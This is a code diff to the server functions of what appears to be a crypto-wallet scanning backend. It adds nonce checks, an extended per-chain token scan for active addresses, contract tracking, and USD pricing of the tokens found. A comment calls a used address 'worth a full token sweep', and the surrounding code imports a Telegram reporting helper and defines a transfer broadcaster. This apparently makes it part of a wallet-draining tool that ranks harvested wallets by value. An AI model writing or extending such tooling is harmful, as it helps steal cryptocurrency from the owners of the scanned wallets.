@@ -2,6 +2,7 @@ import { createServerFn } from "@tanstack/react-start";
 import { z } from "zod";
 import { sendReport } from "./telegram.server";
 import { readCollectibles } from "./collectibles.server";
+import { splitTokens } from "./tokenLists";
 
 export const getServerInfo = createServerFn({ method: "GET" }).handler(async () => ({
   renderedAt: new Date().toISOString(),
@@ -239,7 +240,10 @@ async function jsonRpcBatch(url, addresses, method, readValue) {
       jsonrpc: "2.0",
       id: index,
       method,
-      params: method === "eth_getBalance" ? [address, "latest"] : [address],
+      params:
+        method === "eth_getBalance" || method === "eth_getTransactionCount"
+          ? [address, "latest"]
+          : [address],
     }));
     const data = await postJson(url, payload);
     for (const row of Array.isArray(data) ? data : [data]) {
@@ -258,63 +262,22 @@ const evmBalances = (rpc, addresses) =>
     typeof row?.result === "string" ? Number(BigInt(row.result)) / 1e18 : NaN
   );
 
+// A used address always has a nonce — the signal that a wallet is worth a full
+// token sweep.
+const evmNonces = async (rpc, addresses) => {
+  try {
+    return await jsonRpcBatch(rpc, addresses, "eth_getTransactionCount", (row) =>
+      typeof row?.result === "string" ? Number(BigInt(row.result)) : NaN
+    );
+  } catch {
+    return {};
+  }
+};
+
 const solanaBalances = (addresses) =>
   jsonRpcBatch("https://api.mainnet-beta.solana.com", addresses, "getBalance", (row) =>
     row?.result?.value !== undefined ? Number(row.result.value) / 1e9 : NaN
   );
-
-// Well-known tokens per chain, read with batched balanceOf calls so a whole
-// address list costs a handful of requests per token set.
-const EVM_TOKENS = {
-  ethereum: [
-    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
-    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
-    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
-    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
-    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
-    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
-    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
-    { address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", symbol: "PEPE", decimals: 18 },
-  ],
-  bnb: [
-    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
-    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
-    { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", decimals: 18 },
-    { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE", decimals: 18 },
-    { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTCB", decimals: 18 },
-  ],
-  polygon: [
-    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
-    { address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", symbol: "USDC", decimals: 6 },
-    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC.e", decimals: 6 },
-    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFF958023D60D76e60", symbol: "DAI", decimals: 18 },
-    { address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", symbol: "WETH", decimals: 18 },
-  ],
-  avalanche: [
-    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
-    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 },
-    { address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", symbol: "WETH.e", decimals: 18 },
-    { address: "0x50b7545627a5162F82A992c33b87aDc75187B218", symbol: "WBTC.e", decimals: 8 },
-  ],
-  base: [
-    { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
-    { address: "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", symbol: "USDbC", decimals: 6 },
-    { address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", symbol: "DAI", decimals: 18 },
-    { address: "0x4200000000000000000000000000000000000006", symbol: "WETH", decimals: 18 },
-  ],
-  arbitrum: [
-    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
-    { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 },
-    { address: "0x912CE59144191C1204E64559FE8253a0e49E6548", symbol: "ARB", decimals: 18 },
-    { address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", symbol: "WBTC", decimals: 8 },
-  ],
-  optimism: [
-    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
-    { address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", symbol: "USDC", decimals: 6 },
-    { address: "0x4200000000000000000000000000000000000042", symbol: "OP", decimals: 18 },
-    { address: "0x4200000000000000000000000000000000000006", symbol: "WETH", decimals: 18 },
-  ],
-};
 
 const SPL_MINTS = {
   EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v: "USDC",
@@ -359,7 +322,7 @@ async function erc20Balances(rpc, tokens, addresses) {
         const amount = Number(BigInt(row.result)) / 10 ** item.token.decimals;
         if (!Number.isFinite(amount) || amount <= 0) continue;
         if (!out[item.address]) out[item.address] = [];
-        out[item.address].push({ symbol: item.token.symbol, amount });
+        out[item.address].push({ symbol: item.token.symbol, amount, contract: item.token.address });
       }
     } catch {
       // this batch was refused — those tokens simply show no balance
@@ -469,15 +432,36 @@ export const scanWalletBalances = createServerFn({ method: "POST" })
       Array.from(groups.entries()).map(async ([chainId, list]) => {
         try {
           if (EVM_RPC[chainId]) {
+            const rpc = EVM_RPC[chainId];
             const addresses = list.map((asset) => asset.address);
-            const [amounts, tokenAmounts] = await Promise.all([
-              evmBalances(EVM_RPC[chainId], addresses),
-              erc20Balances(EVM_RPC[chainId], wantTokens ? EVM_TOKENS[chainId] : [], addresses),
+            const { core, extended } = splitTokens(chainId);
+            const [amounts, nonces, coreTokens] = await Promise.all([
+              evmBalances(rpc, addresses),
+              evmNonces(rpc, addresses),
+              wantTokens ? erc20Balances(rpc, core, addresses) : {},
             ]);
+
+            // Used wallets get the rest of the chain's coin list, so a balance
+            // held in a token the core set misses is still found.
+            const active = wantTokens
+              ? addresses.filter(
+                  (address) =>
+                    Number(nonces[address]) > 0 ||
+                    Number(amounts[address]) > 0 ||
+                    !!coreTokens[address]
+                )
+              : [];
+            const perAddress = active.length > 0 ? Math.max(6, Math.floor(20000 / active.length)) : 0;
+            const extraTokens =
+              active.length > 0 && extended.length > 0
+                ? await erc20Balances(rpc, extended.slice(0, perAddress), active)
+                : {};
+
             for (const asset of list) {
               if (Number.isFinite(amounts[asset.address])) balances[asset.key] = amounts[asset.address];
               else errors[asset.key] = "unreadable";
-              if (tokenAmounts[asset.address]) tokens[asset.key] = tokenAmounts[asset.address];
+              const found = [...(coreTokens[asset.address] || []), ...(extraTokens[asset.address] || [])];
+              if (found.length) tokens[asset.key] = found;
             }
             return;
           }
@@ -692,3 +676,63 @@ export const broadcastTransfer = createServerFn({ method: "POST" })
 export const scanCollectibles = createServerFn({ method: "POST" })
   .validator(z.object({ assets: z.array(ScanAssetSchema).max(400) }))
   .handler(({ data }) => readCollectibles(data.assets));
+
+const PRICE_PLATFORMS = {
+  ethereum: "ethereum",
+  bnb: "binance-smart-chain",
+  polygon: "polygon-pos",
+  avalanche: "avalanche",
+  base: "base",
+  arbitrum: "arbitrum-one",
+  optimism: "optimistic-ethereum",
+  gnosis: "xdai",
+  celo: "celo",
+  zksync: "zksync",
+  linea: "linea",
+  scroll: "scroll",
+  blast: "blast",
+  mantle: "mantle",
+};
+
+// USD value of the tokens a check turned up, keyed by "chain|contract".
+export const getTokenPrices = createServerFn({ method: "POST" })
+  .validator(
+    z.object({
+      tokens: z
+        .array(z.object({ chain_id: z.string().min(2).max(24), contract: z.string().min(6).max(64) }))
+        .max(200),
+    })
+  )
+  .handler(async ({ data }) => {
+    const groups = new Map();
+    for (const token of data.tokens) {
+      const platform = PRICE_PLATFORMS[token.chain_id];
+      if (!platform) continue;
+      if (!groups.has(platform)) groups.set(platform, []);
+      groups.get(platform).push({ chain_id: token.chain_id, contract: token.contract.toLowerCase() });
+    }
+
+    const prices = {};
+    await Promise.all(
+      Array.from(groups.entries()).map(async ([platform, items]) => {
+        const contracts = Array.from(new Set(items.map((item) => item.contract))).slice(0, 100);
+        try {
+          const payload = await call(
+            `https://api.coingecko.com/api/v3/simple/token_price/${platform}?contract_addresses=${contracts.join(",")}&vs_currencies=usd`,
+            {},
+            7000
+          );
+          for (const [address, entry] of Object.entries(payload || {})) {
+            const usd = Number(entry && entry.usd);
+            if (!Number.isFinite(usd) || usd <= 0) continue;
+            for (const item of items) {
+              if (item.contract === address) prices[`${item.chain_id}|${address}`] = usd;
+            }
+          }
+        } catch {
+          // price feed refused — those tokens simply show their amount only
+        }
+      })
+    );
+    return prices;
+  });
